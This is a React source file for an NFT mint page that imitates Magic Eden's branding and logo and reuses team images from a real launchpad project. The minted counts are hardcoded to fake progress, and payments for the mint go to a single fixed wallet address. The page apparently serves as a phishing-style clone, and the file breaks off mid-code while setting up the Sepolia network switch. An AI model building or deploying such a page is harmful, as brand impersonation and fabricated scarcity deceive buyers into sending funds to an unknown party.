import { useEffect, useMemo, useState } from "react";
import { BrowserProvider, formatEther, parseEther } from "ethers";

const RECEIVER = "0x8A3F0f3De937Cf08D6A4144e945A354954F878E9";
const PRICE_PER_ITEM_ETH = "0.1";

const SEPOLIA_CHAIN_ID_DEC = 11155111n;
const SEPOLIA_CHAIN_ID_HEX = "0xAA36A7";

// minted UI (визуально)
const TOTAL_MINTED_PERCENT = 15.9;
const TOTAL_MINTED = 239;
const TOTAL_SUPPLY = 1500;

const IMAGES = ["/images/nft1.avif", "/images/nft2.avif", "/images/nft3.avif", "/images/nft4.avif"];

const TEAM = [
  {
    name: "Evgeny",
    role: "CEO",
    img: "https://img-cdn.magiceden.dev/rs:fill:300:0:0/plain/https%3A%2F%2Fmedia.cdn.magiceden.dev%2Flaunchpad%2Fmeta_racing_pilots%2F473fd4ff-94fc-41da-86ea-458780053810",
    x: null,
  },
  {
    name: "Snowman",
    role: "CMO",
    img: "https://img-cdn.magiceden.dev/rs:fill:300:0:0/plain/https%3A%2F%2Fmedia.cdn.magiceden.dev%2Flaunchpad%2Fmeta_racing_pilots%2Faba4340f-7cf2-4f23-abf4-063ea3701012",
    x: "https://x.com/sol_snowman",
  },
  {
    name: "Myu",
    role: "Content Lead",
    img: "https://img-cdn.magiceden.dev/rs:fill:300:0:0/plain/https%3A%2F%2Fmedia.cdn.magiceden.dev%2Flaunchpad%2Fmeta_racing_pilots%2Fbc3558e2-e903-464a-bd75-3e83bb793335",
    x: "https://x.com/meta_myu",
  },
  {
    name: "Extreme",
    role: "Community Mod",
    img: "https://img-cdn.magiceden.dev/rs:fill:300:0:0/plain/https%3A%2F%2Fmedia.cdn.magiceden.dev%2Flaunchpad%2Fmeta_racing_pilots%2Fdb0f74fa-244f-491f-8891-5b0abc41a975",
    x: "https://x.com/League0fgamess",
  },
  {
    name: "OL",
    role: "Partnership Lead",
    img: "https://img-cdn.magiceden.dev/rs:fill:300:0:0/plain/https%3A%2F%2Fmedia.cdn.magiceden.dev%2Flaunchpad%2Fmeta_racing_pilots%2F82f863e6-69c6-4442-af30-9a945e990cc1",
    x: "https://x.com/ol_onx",
  },
];

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

:root{
  --brand: 236 19 109;
  --brand-darker: 201 8 89;

  --textColor-primary: 242 242 243;
  --textColor-secondary: 133 127 148;

  --textColor-positive: 42 223 114;
  --textColor-attention: 236 182 19;
  --textColor-negative: 234 65 65;

  --bg: #100c18;
  --layer-01: #15111d;
  --panel: #1e1929;
  --layer-03: #1b1624;

  --borderColor-primary: 35 30 47;
  --borderColor-interactive: 71 64 89/60%;
  --borderColor-interactive-hover: 111 104 125/50%;
  --borderColor-interactive-focus: 133 127 148/50%;

  --button-primary: 236 19 109;
  --button-primary-hover: 201 8 89;
  --button-primary-active: 236 19 109;
  --button-primary-disabled: 236 19 109/20%;
  --button-secondary: 62 56 77/60%;
  --button-secondary-hover: 62 56 77/40%;
  --button-secondary-active: 71 64 89/90%;
  --button-secondary-disabled: 62 56 77/30%;

  --text: rgb(var(--textColor-primary));
  --muted: rgb(var(--textColor-secondary) / .82);

  --shadow: 0 18px 60px rgb(0 0 0 / .55);
  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
  --sans: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;

  --nav-h: 64px;
  --nav-pad-x: 18px;
  --nav-pad-x-m: 12px;

  --media-radius: 14px;
  --thumb-radius: 12px;
  --media-gap: 12px;

  --search-gap-left: 16px;
  --search-gap-right: 16px;

  --card-radius: 14px;
}

*{ box-sizing:border-box; }
html, body, #root { height: auto !important; min-height: 100%; }
html { overflow-x:hidden; }
body{
  margin:0;
  overflow-x:hidden;
  overflow-y:auto !important;
  font-family:var(--sans);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  color:var(--text);
  background:
    radial-gradient(1100px 650px at 50% -10%, rgb(var(--brand) / .10), transparent 60%),
    radial-gradient(900px 550px at 80% 10%, rgb(120 90 255 / .10), transparent 60%),
    linear-gradient(180deg, var(--bg), var(--bg));
}

#root{ width:100%; max-width:none; margin:0; padding:0; }
a{color:inherit; text-decoration:none}
button{font-family:inherit}
.page{
  min-height:100vh;
  width:100%;
  overflow: visible !important;
  padding-top: var(--nav-h);
}
button, input { outline: none; }
button:focus, button:focus-visible { outline: none; box-shadow: none; }
input:focus, input:focus-visible { outline: none; box-shadow: none; }

/* ===== NAVBAR ===== */
.header{
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  z-index: 9999;
}
.headerBar{
  height: var(--nav-h);
  min-height: var(--nav-h);
  width: 100%;
  display:flex;
  align-items:center;
  background: rgb(21 17 29 / 1);
  border-bottom: 1px solid rgb(var(--borderColor-primary));
  backdrop-filter: blur(10px);
}
.nav{
  width:100%;
  height: 100%;
  display:flex;
  align-items:center;
  justify-content: space-between;
  gap: 12px;
  padding: 0 var(--nav-pad-x);
  min-width: 0;
  flex-wrap: nowrap;
}
.navLeft{
  display:flex;
  align-items:center;
  gap: 18px;
  height:100%;
  flex: 0 0 auto;
  min-width: 0;
}
.logoWrap{
  display:flex;
  align-items:center;
  gap: 10px;
  height:100%;
  flex: 0 0 auto;
}
.meLogoSvg{
  height: 18px;
  width: 190px;
  display:block;
}

.navLinks{
  display:flex;
  align-items:center;
  gap: 30px;
  height:100%;
}
.navLink{
  font-weight: 800;
  font-size: 13px;
  opacity: .95;
  cursor: pointer;
  transition: opacity .15s ease;
  white-space: nowrap;
}
.navLink:hover{ opacity: .78; }

.navSearch{
  flex: 1;
  min-width: 0;
  display:flex;
  align-items:center;
  padding: 0 var(--search-gap-left) 0 var(--search-gap-right);
}
.searchWrap{
  width: 100%;
  height: 40px;
  display:flex;
  align-items:center;
  border-radius: 8px;
  background: transparent;
  border: 1px solid rgb(var(--borderColor-interactive));
  transition: border-color .15s ease, background .15s ease;
  overflow:hidden;
}
.searchWrap:hover{ border-color: rgb(var(--borderColor-interactive-hover)); }
.searchWrap:focus-within{ border-color: rgb(var(--borderColor-interactive-focus)); }
.searchLeft{
  width: 36px;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  opacity: .95;
  flex: 0 0 auto;
  color: rgb(var(--textColor-primary));
}
.searchInput{
  flex: 1;
  height: 40px;
  border: none;
  background: transparent;
  color: rgb(var(--textColor-primary));
  font-size: 13px;
  padding: 0 10px 0 0;
  min-width: 0;
}
.searchRight{
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  flex: 0 0 auto;
  padding-right: 12px;
}
.kbd{ display:flex; align-items:center; justify-content:center; gap: 6px; transform: translateY(.5px); }
.kbdKey{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  height: 24px;
  padding: 0 8px;
  border-radius: 8px;
  border: none;
  background: rgba(255,255,255,.06);
  color: rgb(var(--textColor-secondary));
  font-weight: 800;
  font-size: 12px;
  line-height: 1;
}

.navRight{
  display:flex;
  align-items:center;
  gap: 10px;
  flex: 0 0 auto;
  min-width: 0;
  flex-wrap: nowrap;
}

.btnSecondary{
  height: 40px;
  padding: 0 14px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-secondary));
  color: rgb(var(--textColor-primary));
  font-weight: 800;
  font-size: 13px;
  cursor: pointer;
  transition: background .12s ease;
  display:inline-flex;
  align-items:center;
  justify-content:center;
  white-space: nowrap;
}
.btnSecondary:hover{ background: rgb(var(--button-secondary-hover)); }
.btnSecondary:active{ background: rgb(var(--button-secondary-active)); }
.btnSecondary:disabled{ background: rgb(var(--button-secondary-disabled)); opacity:.6; cursor:not-allowed; }

.btnPrimary{
  height: 40px;
  padding: 0 16px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-primary));
  color: rgb(242 242 243);
  font-weight: 900;
  font-size: 13px;
  cursor:pointer;
  transition: background .12s ease;
  min-width: 120px;
  white-space: nowrap;
}
.btnPrimary:hover{ background: rgb(var(--button-primary-hover)); }
.btnPrimary:active{ background: rgb(var(--button-primary-active)); }
.btnPrimary:disabled{ background: rgb(var(--button-primary-disabled)); cursor:not-allowed; }

.btnPrimaryMobile{
  height: 36px;
  min-width: 92px;
  padding: 0 10px;
  font-size: 12px;
  border-radius: 8px;
}

.iconBtn{
  width: 40px;
  height: 40px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-secondary));
  color: rgb(var(--textColor-primary));
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  transition: background .12s ease;
  flex: 0 0 auto;
}
.iconBtn:hover{ background: rgb(var(--button-secondary-hover)); }
.iconBtn:active{ background: rgb(var(--button-secondary-active)); }

.iconBtnSmall{
  width: 36px;
  height: 36px;
  border-radius: 8px;
}

/* dropdown menu */
.mobileMenu{
  width: 100%;
  background: rgb(21 17 29 / 1);
  border-bottom: 1px solid rgb(var(--borderColor-primary));
  padding: 10px var(--nav-pad-x-m) 14px;
}
.mobileItem{
  width: 100%;
  height: 42px;
  border-radius: 10px;
  border: none;
  background: rgb(var(--button-secondary));
  color: rgb(var(--textColor-primary));
  font-weight: 800;
  padding: 0 12px;
  display:flex;
  align-items:center;
  justify-content:flex-start;
  margin-top: 8px;
}
.mobileItem:hover{ background: rgb(var(--button-secondary-hover)); }

/* search row (tablet+mobile toggle) */
.mobileSearchRow{
  width: 100%;
  background: rgb(21 17 29 / 1);
  border-bottom: 1px solid rgb(var(--borderColor-primary));
  padding: 10px var(--nav-pad-x-m) 12px;
}
.mobileSearchWrap{
  width: 100%;
  height: 40px;
  display:flex;
  align-items:center;
  border-radius: 10px;
  background: rgba(255,255,255,.04);
  border: 1px solid rgb(var(--borderColor-interactive));
  overflow:hidden;
}
.mobileSearchInput{
  flex: 1;
  height: 40px;
  border: none;
  background: transparent;
  color: rgb(var(--textColor-primary));
  font-size: 13px;
  padding: 0 12px;
}

/* ===== Page Layout ===== */
.shell{
  max-width: 1240px;
  margin: 0 auto;
  padding: 22px 18px 44px;
}

.iconGhost{
  width: 36px;
  height: 36px;
  border: none;
  background: transparent;
  padding: 0;
  margin: 0;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  color: rgb(var(--textColor-primary)); /* цвет самой лупы */
  flex: 0 0 auto;
}

.iconGhost:hover{
  background: rgba(255,255,255,.06); /* лёгкий hover, можно убрать */
}

.iconGhost:active{
  background: rgba(255,255,255,.10);
}

.heroRow{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 12px;
  flex-wrap: wrap;
}
.heroLeft{
  display:flex;
  align-items:center;
  gap: 12px;
  min-width: 0;
}
.chainBadge{
  font-weight: 800;
  font-size: 12px;
  color: rgb(121 192 255);
  opacity: .85;
  letter-spacing: .6px;
}
.title{
  font-size: 34px;
  font-weight: 900;
  letter-spacing: .2px;
  line-height: 1.1;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 100%;
}
.heroRight{
  display:flex;
  align-items:center;
  gap: 12px;
  flex-wrap: wrap;
}
.heroIcons{
  display:flex;
  gap: 12px;
}

.mainGrid{
  margin-top: 16px;
  display:grid;
  grid-template-columns: 1.1fr .9fr;
  gap: 22px;
  align-items:start;
  width: 100%;
  min-width: 0;
}

/* ===== MEDIA ===== */
.mediaCard{ background: transparent; border: none; box-shadow: none; border-radius: 0; overflow: visible; min-width:0; }
.mediaWrap{
  width: 100%;
  max-width: 580px;
  margin: 0 auto;
}
.mediaMain{
  position: relative;
  width: 100%;
  aspect-ratio: 1 / 1;
  display:flex;
  align-items:center;
  justify-content:center;
}
.mainImg{
  width: 100%;
  height: 100%;
  object-fit: contain;
  object-position: center;
  background: transparent;
  border: none;
  border-radius: var(--media-radius);
}
.fullscreen{
  position:absolute;
  right: 14px;
  top: 14px;
  width: 38px;
  height: 38px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius: 8px;
  border: 1px solid rgb(var(--borderColor-interactive));
  background: rgba(255,255,255,.06);
  color: rgba(236,234,247,.9);
}

/* thumbs */
.thumbRow{
  width: 100%;
  display:grid;
  grid-template-columns: repeat(4, minmax(0, 1fr));
  gap: var(--media-gap);
  margin-top: var(--media-gap);
  padding: 0;
}
.thumbBtn{
  width: 100%;
  aspect-ratio: 1 / 1;
  border-radius: var(--thumb-radius);
  border: none;
  background: transparent;
  padding: 0;
  overflow: hidden;
  cursor: pointer;
  opacity: .85;
  transition: filter .12s ease, opacity .12s ease, outline-color .12s ease;
}
.thumbBtn:hover{ filter: brightness(.92); }
.thumbBtn.active{
  outline: 2px solid rgb(var(--brand));
  opacity: 1;
}
.thumbImg{
  width: 100%;
  height: 100%;
  display:block;
  border-radius: var(--thumb-radius);
  object-fit: cover;
  object-position: center;
}

/* ===== LEFT DESCRIPTION ===== */
.descWrap{
  width: 100%;
  max-width: 580px;
  margin: 18px auto 0;
  display:flex;
  flex-direction:column;
  gap: 14px;
}
.layerBox{
  background: rgb(21 17 29 / 1);
  border: 1px solid rgb(var(--borderColor-primary));
  border-radius: 14px;
  box-shadow: 0 10px 40px rgb(0 0 0 / .28);
  overflow:hidden;
}
.layerBoxInner{ padding: 14px; }

.sectionTitle{
  font-size: 18px;
  font-weight: 900;
  letter-spacing: .2px;
  margin: 4px 0 10px;
}
.divider{
  height: 1px;
  background: rgb(var(--borderColor-primary));
  margin: 12px 0 14px;
}

.p{
  font-size: 13px;
  line-height: 1.55;
  margin: 0 0 12px 0;
  color: rgba(242,242,243,.82);
}
.p:last-child{ margin-bottom: 0; }
.brandStrong{ color: rgb(var(--brand)); font-weight: 900; }

.list{ margin: 8px 0 12px 18px; padding: 0; }
.li{ font-size: 13px; line-height: 1.55; margin: 6px 0; color: rgba(242,242,243,.80); }

.h3{ margin: 10px 0 8px; font-size: 16px; font-weight: 900; color: rgba(242,242,243,.92); }

/* team grid */
.teamGrid{
  display:grid;
  gap: 12px;
  grid-template-columns: repeat(2, minmax(0, 1fr));
}
@media (min-width: 560px){
  .teamGrid{ grid-template-columns: repeat(3, minmax(0, 1fr)); }
}
.teamCard{
  background: rgb(21 17 29 / 1);
  border: 1px solid rgb(var(--borderColor-primary));
  border-radius: 12px;
  overflow:hidden;
}
.teamImgWrap{ width: 100%; aspect-ratio: 1 / 1; background: rgba(255,255,255,.04); }
.teamImg{ width: 100%; height: 100%; object-fit: cover; display:block; }
.teamBody{
  padding: 10px;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:space-between;
  gap: 8px;
  min-height: 84px;
}
.teamName{ font-weight: 900; font-size: 13px; color: rgba(242,242,243,.92); text-align:center; }
.teamRole{ font-weight: 700; font-size: 11px; color: rgba(133,127,148,.95); text-align:center; }
.teamLinks{ height: 18px; display:flex; align-items:center; justify-content:center; }
.xLink{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  width: 28px;
  height: 28px;
  border-radius: 10px;
  background: rgba(255,255,255,.05);
  border: 1px solid rgb(var(--borderColor-interactive));
  transition: opacity .12s ease, background .12s ease;
}
.xLink:hover{ opacity: .85; background: rgba(255,255,255,.07); }
.xIcon{ display:block; }

/* ===== Mint panel ===== */
.panel{
  background: var(--panel);
  border: 1px solid rgb(var(--borderColor-primary));
  border-radius: 16px;
  box-shadow: var(--shadow);
  overflow:hidden;
  position: sticky;
  top: calc(var(--nav-h) + 16px);
}
.panelInner{ padding: 18px; }

.mintDesktop{ display:block; }
.mintMobile{ display:none; margin-top: 18px; max-width: 580px; margin-left:auto; margin-right:auto; }
.panelMobile{ position: static; top: auto; }

.metaRow{
  display:flex;
  align-items:flex-start;
  justify-content:space-between;
  gap: 12px;
  margin-bottom: 12px;
}
.metaLeft{ display:flex; flex-direction:column; gap: 10px; }
.metaLine{ display:flex; align-items:center; gap: 12px; flex-wrap: nowrap; }

.eligPill{
  display:inline-flex;
  align-items:center;
  gap: 8px;
  height: 30px;
  padding: 0 10px;
  border-radius: 10px;
  border: 1px solid rgb(var(--borderColor-interactive));
  background: transparent;
  color: rgba(242,242,243,.92);
  font-weight: 900;
  font-size: 13px;
  white-space: nowrap;
}
.lockIcon{ font-size: 13px; opacity: .9; }
.publicRow{
  display:flex;
  align-items:center;
  gap: 8px;
  color: rgba(242,242,243,.72);
  font-size: 13px;
  font-weight: 900;
  white-space: nowrap;
}
.greenDot{
  width: 8px;
  height: 8px;
  border-radius: 999px;
  background: rgb(var(--textColor-positive));
  box-shadow: 0 0 10px rgb(var(--textColor-positive) / .18);
}

.mintedBox{
  min-width: 240px;
  display:flex;
  flex-direction:column;
  align-items:stretch;
  gap: 8px;
}
.mintedHeader{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 10px;
}
.mintedTop{ font-size: 12px; color: rgba(133,127,148,.90); font-weight: 600; }
.mintedNums{ font-size: 12px; color: rgba(242,242,243,.86); font-weight: 900; white-space: nowrap; }
.mintedBar{
  width: 100%;
  height: 6px;
  border-radius: 999px;
  background: rgba(255,255,255,.10);
  overflow:hidden;
}
.mintedFill{
  height: 100%;
  width: var(--pct, 0%);
  background: rgb(var(--brand));
  border-radius: 999px;
}

.rowTop{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 14px;
  margin-top: 10px;
}
.priceBlock .label{ font-size: 14px; color: rgba(242,242,243,.76); font-weight: 900; }
.priceBlock .priceLine{ display:flex; align-items:baseline; gap: 10px; margin-top: 6px; }
.priceBig{ font-size: 28px; font-weight: 900; }
.usd{ font-size: 13px; color: rgba(133,127,148,.90); font-weight: 700; }

.stepper{
  display:flex;
  align-items:center;
  justify-content:space-between;
  height: 40px;
  padding: 0 6px;
  border-radius: 10px;
  background: rgb(var(--button-secondary));
  border: none;
  min-width: 150px;
}
.stepBtn{
  width: 40px;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius: 10px;
  border: none;
  background: transparent;
  color: var(--text);
  font-size: 18px;
  line-height: 1;
  padding: 0;
  cursor:pointer;
  transition: background .12s ease;
}
.stepBtn:hover{ background: rgb(var(--button-secondary-hover)); }
.stepBtn:disabled{opacity:.35; cursor:not-allowed; background: transparent;}
.stepVal{
  flex: 1;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  text-align:center;
  font-weight: 900;
  line-height: 1;
}

.fees{
  margin-top: 12px;
  display:grid;
  grid-template-columns: 1fr auto;
  gap: 8px 12px;
  color: rgba(242,242,243,.72);
  font-size: 12px;
}
.fees .r{ text-align:right; font-weight: 900; color: rgba(242,242,243,.82); }
.smallLink{ color: rgba(133,127,148,.90); text-decoration: underline; cursor: default; }

.terms{
  margin-top: 14px;
  display:flex;
  gap: 10px;
  align-items:flex-start;
  color: rgba(133,127,148,.90);
  font-size: 12px;
  line-height: 1.35;
}
.cb{
  appearance: none;
  -webkit-appearance: none;
  width: 18px;
  height: 18px;
  border-radius: 8px;
  border: none;
  background: rgb(var(--button-secondary));
  display:inline-grid;
  place-items:center;
  margin-top: 2px;
  cursor: pointer;
  transition: background .12s ease;
}
.cb:hover{ background: rgb(var(--button-secondary-hover)); }
.cb:checked::after{
  content: "✓";
  font-size: 14px;
  font-weight: 900;
  color: rgba(242,242,243,.92);
  transform: translateY(-0.5px);
}

.primaryCta{
  margin-top: 14px;
  width: 100%;
  padding: 13px 14px;
  border-radius: 12px;
  border: none;
  background: rgb(var(--button-primary));
  color: rgba(242,242,243,1);
  font-weight: 900;
  cursor:pointer;
  transition: background .12s ease;
}
.primaryCta:hover{ background: rgb(var(--button-primary-hover)); }
.primaryCta:disabled{opacity:.55; cursor:not-allowed}
.primaryCta.notBold{ font-weight: 800; }

.noticeLock{
  margin-top: 12px;
  padding: 12px 12px;
  border-radius: 12px;
  background: rgba(0,0,0,.18);
  border: 1px solid rgb(var(--borderColor-primary));
  color: rgba(242,242,243,.72);
  font-size: 12px;
  display:flex;
  gap:10px;
  align-items:center;
}
.txBox{
  margin-top: 12px;
  padding: 12px;
  border-radius: 12px;
  border: 1px solid rgb(var(--borderColor-primary));
  background: rgba(255,255,255,.04);
  font-size: 12px;
  color: rgba(242,242,243,.72);
}
.txBox a{
  display:inline-block;
  margin-top: 8px;
  color: rgba(154, 215, 255, .95);
  font-weight: 900;
}
.err{
  margin-top: 12px;
  padding: 12px;
  border-radius: 12px;
  border: 1px solid rgba(234, 65, 65, .35);
  background: rgba(234, 65, 65, .12);
  color: rgba(255, 220, 220, .95);
  font-size: 12px;
}

/* responsive layout */
@media (max-width: 1050px){
  .mainGrid{ grid-template-columns: 1fr; }
  .panel{ position: static; top: auto; }
  .mintedBox{ min-width: 0; }
  .mintDesktop{ display:none; }
  .mintMobile{ display:block; }
}

/* tablet sizing */
@media (max-width: 1024px){
  :root{ --nav-h: 56px; }
  .page{ padding-top: var(--nav-h); }
  .headerBar{ height: var(--nav-h); min-height: var(--nav-h); }
  .meLogoSvg{ width: 160px; }
  .btnSecondary{ height: 38px; padding: 0 12px; }
  .btnPrimary{ height: 38px; min-width: 110px; padding: 0 12px; font-size: 12px; }
  .iconBtn{ width: 38px; height: 38px; }
}

/* phone sizing */
@media (max-width: 640px){
  :root{ --nav-h: 48px; }
  .page{ padding-top: var(--nav-h); }
  .headerBar{ height: var(--nav-h); min-height: var(--nav-h); }
  .nav{ padding: 0 var(--nav-pad-x-m); gap: 8px; }
  .meLogoSvg{ width: 145px; }
}
`;

function shortAddr(a) {
  if (!a) return "";
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function SearchIcon() {
  return (
    <svg viewBox="0 0 21 20" fill="none" width="20" height="20" aria-hidden="true">
      <path
        d="M9.86686 15.8333C13.5488 15.8333 16.5335 12.8486 16.5335 9.16667C16.5335 5.48477 13.5488 2.5 9.86686 2.5C6.18496 2.5 3.2002 5.48477 3.2002 9.16667C3.2002 12.8486 6.18496 15.8333 9.86686 15.8333Z"
        stroke="currentColor"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
      <path
        d="M18.2002 17.5L14.5752 13.875"
        stroke="currentColor"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function XIcon() {
  return (
    <svg className="xIcon" viewBox="0 0 20 21" fill="none" width="16" height="16" aria-hidden="true">
      <path
        d="M11.3032 9.42806L16.4029 3.5H15.1945L10.7663 8.64725L7.2296 3.5H3.15039L8.49863 11.2836L3.15039 17.5H4.35894L9.03516 12.0644L12.7702 17.5H16.8494L11.3029 9.42806H11.3032ZM9.6479 11.3521L9.10601 10.5771L4.7944 4.40978H6.65066L10.1302 9.38698L10.6721 10.162L15.195 16.6316H13.3388L9.6479 11.3524V11.3521Z"
        fill="currentColor"
      />
    </svg>
  );
}

function MagicEdenLogo() {
  return (
    <svg
      viewBox="0 0 176 20"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className="meLogoSvg"
      aria-label="Magic Eden"
      role="img"
    >
      <path
        d="M23.5949 5.09192L25.5453 7.38358C25.7686 7.64098 25.9666 7.85271 26.0467 7.97311C26.63 8.55281 26.957 9.33628 26.9566 10.1527C26.9018 11.1158 26.2741 11.7718 25.6928 12.4734L24.3279 14.0759L23.616 14.9062C23.5904 14.9349 23.574 14.9702 23.5686 15.008C23.5632 15.0458 23.5692 15.0842 23.5858 15.1187C23.6024 15.1531 23.6288 15.182 23.6619 15.2018C23.695 15.2216 23.7332 15.2314 23.7718 15.2301H30.887C31.9738 15.2301 33.3429 16.1434 33.2629 17.53C33.2607 18.1603 33.0056 18.7641 32.5534 19.2097C32.1012 19.6554 31.4885 19.9067 30.849 19.9089H19.7067C18.9737 19.9089 17.0021 19.9878 16.4503 18.3064C16.3329 17.955 16.3169 17.5785 16.404 17.2187C16.5644 16.6866 16.8181 16.1864 17.1538 15.7407C17.7141 14.9104 18.3207 14.0801 18.9189 13.2747C19.6898 12.2202 20.4818 11.1989 21.2611 10.1236C21.2888 10.0886 21.3038 10.0455 21.3038 10.0011C21.3038 9.95678 21.2888 9.91368 21.2611 9.87868L18.4302 6.55742C18.4118 6.53334 18.3879 6.51381 18.3605 6.50037C18.3331 6.48692 18.3029 6.47992 18.2723 6.47992C18.2416 6.47992 18.2114 6.48692 18.184 6.50037C18.1566 6.51381 18.1327 6.53334 18.1143 6.55742C17.356 7.56625 14.0365 12.0333 13.3287 12.9384C12.621 13.8434 10.877 13.8932 9.9123 12.9384L5.48484 8.55848C5.45655 8.53051 5.42048 8.51145 5.38119 8.50372C5.3419 8.49599 5.30117 8.49994 5.26416 8.51506C5.22715 8.53019 5.19553 8.5558 5.17332 8.58866C5.15111 8.62152 5.1393 8.66015 5.1394 8.69963V17.1232C5.14982 17.7209 4.97021 18.3069 4.62573 18.799C4.28125 19.2911 3.78917 19.6647 3.21844 19.8674C2.85377 19.9924 2.46403 20.0298 2.08173 19.9763C1.69943 19.9228 1.33565 19.78 1.02071 19.5598C0.70578 19.3396 0.448823 19.0484 0.271268 18.7105C0.0937132 18.3726 0.000705322 17.9977 0 17.6172V2.47228C0.0253814 1.92649 0.224654 1.40247 0.569503 0.974675C0.914352 0.546881 1.38723 0.237072 1.92096 0.0892728C2.37877 -0.0309286 2.8607 -0.0297259 3.31789 0.0927586C3.77508 0.215243 4.1913 0.454656 4.52436 0.786737L11.332 7.50398C11.3523 7.52438 11.377 7.54012 11.4042 7.55008C11.4315 7.56003 11.4606 7.56396 11.4895 7.56158C11.5185 7.55921 11.5465 7.55058 11.5717 7.53632C11.5969 7.52206 11.6186 7.50252 11.6353 7.47907L16.4714 0.882224C16.6948 0.614417 16.975 0.397995 17.2923 0.248114C17.6096 0.0982325 17.9562 0.0185155 18.3081 0.0145452H30.887C31.2312 0.0151045 31.5714 0.0880957 31.8847 0.228638C32.198 0.369181 32.4773 0.574035 32.7038 0.829499C32.9303 1.08496 33.0988 1.38515 33.1982 1.70998C33.2975 2.03481 33.3253 2.37679 33.2797 2.71307C33.1911 3.2964 32.8908 3.82825 32.4345 4.20997C31.9782 4.59169 31.3969 4.79737 30.7985 4.78885H23.755C23.7196 4.7897 23.6851 4.79989 23.655 4.81835C23.625 4.83681 23.6005 4.86287 23.5842 4.89382C23.5678 4.92477 23.5602 4.95947 23.5621 4.99431C23.564 5.02915 23.5753 5.06286 23.5949 5.09192Z"
        fill="rgb(var(--brand))"
      />
      <text
        x="40"
        y="14"
        fill="rgb(var(--textColor-primary))"
        fontFamily="Inter, sans-serif"
        fontWeight="800"
        fontSize="12"
        letterSpacing=".2"
      >
        MAGIC EDEN
      </text>
    </svg>
  );
}

export default function App() {
  const [account, setAccount] = useState(null);
  const [qty, setQty] = useState(1);
  const [txHash, setTxHash] = useState(null);
  const [error, setError] = useState(null);
  const [status, setStatus] = useState("idle"); // idle | sending | success
  const [chainId, setChainId] = useState(null);
  const [accepted, setAccepted] = useState(false);
  const [activeThumb, setActiveThumb] = useState(0);

  const [menuOpen, setMenuOpen] = useState(false);
  const [searchRowOpen, setSearchRowOpen] = useState(false);

  // === breakpoint mode (JS, to avoid CSS "leaks") ===
  const [mode, setMode] = useState(() => {
    const w = typeof window !== "undefined" ? window.innerWidth : 1200;
    if (w <= 640) return "mobile";
    if (w <= 1024) return "tablet";
    return "desktop";
  });

  useEffect(() => {
    const onResize = () => {
      const w = window.innerWidth;
      const next = w <= 640 ? "mobile" : w <= 1024 ? "tablet" : "desktop";
      setMode(next);

      // prevent stuck dropdowns after crossing breakpoints
      setMenuOpen(false);
      setSearchRowOpen(false);
    };
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);

  const isMobile = mode === "mobile";
  const isTablet = mode === "tablet";
  const isDesktop = mode === "desktop";

  const itemWei = useMemo(() => parseEther(PRICE_PER_ITEM_ETH), []);
  const totalWei = useMemo(() => itemWei * BigInt(qty), [itemWei, qty]);

  const eligible = !!account;

  const refreshNetwork = async () => {
    try {
      if (!window.ethereum) return;
      const provider = new BrowserProvider(window.ethereum);
      const net = await provider.getNetwork();
      setChainId(net.chainId);
    } catch {}
  };

  useEffect(() => {
    const init = async () => {
      if (!window.ethereum) return;
      try {
        const provider = new BrowserProvider(window.ethereum);
        const net = await provider.getNetwork();
        setChainId(net.chainId);

        const accs = await provider.send("eth_accounts", []);
        if (accs?.[0]) setAccount(accs[0]);
      } catch {}
    };
    init();
  }, []);

  useEffect(() => {
    if (!window.ethereum) return;

    const onChainChanged = () => refreshNetwork();
    const onAccountsChanged = (accs) => setAccount(accs?.[0] ?? null);

    window.ethereum.on?.("chainChanged", onChainChanged);
    window.ethereum.on?.("accountsChanged", onAccountsChanged);

    return () => {
      window.ethereum.removeListener?.("chainChanged", onChainChanged);
      window.ethereum.removeListener?.("accountsChanged", onAccountsChanged);
    };
  }, []);

  const connect = async () => {
    try {
      setError(null);
      setTxHash(null);

      if (!window.ethereum) {
        throw new Error("Wallet не найден. Открой в браузере с MetaMask и установи расширение.");
      }

      const provider = new BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      setAccount(await signer.getAddress());

      const net = await provider.getNetwork();
      setChainId(net.chainId);
    } catch (e) {
      setError(e?.message ?? String(e));
    }
  };

  const switchToSepolia = async () => {
    try {
      setError(null);
      if (!window.ethereum) throw new Error("Wallet не найден.");

      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: SEPOLIA_CHAIN_ID_HEX }],
        });
      } catch (switchError) {
        if (switchError?.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: SEPOLIA_CHAIN_ID_HEX,
                chainName: "Sepolia",
                nativeCurrency: { name: "SepoliaETH", symbol: "ETH", decimals: 18 },
                rpcUrls: ["https://ethereum-sepolia-rpc.publicnode.com"],
                blockExplorerUrls: ["https://sepolia.etherscan.io"],
              },
            ],
